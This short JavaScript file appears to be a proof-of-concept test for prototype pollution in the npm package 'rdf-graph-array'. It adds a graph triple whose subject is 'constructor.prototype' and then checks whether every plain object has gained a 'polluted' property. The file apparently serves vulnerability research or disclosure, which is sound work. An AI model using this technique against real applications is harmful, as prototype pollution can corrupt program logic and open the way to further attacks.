var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const Graph = require('rdf-graph-array').Graph;
let g = new Graph();
console.log({}.polluted);
g.add({
    graph: 'foo',
    subject: 'constructor.prototype',
    predicate: 'polluted',
    object: 'JHU'
});
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}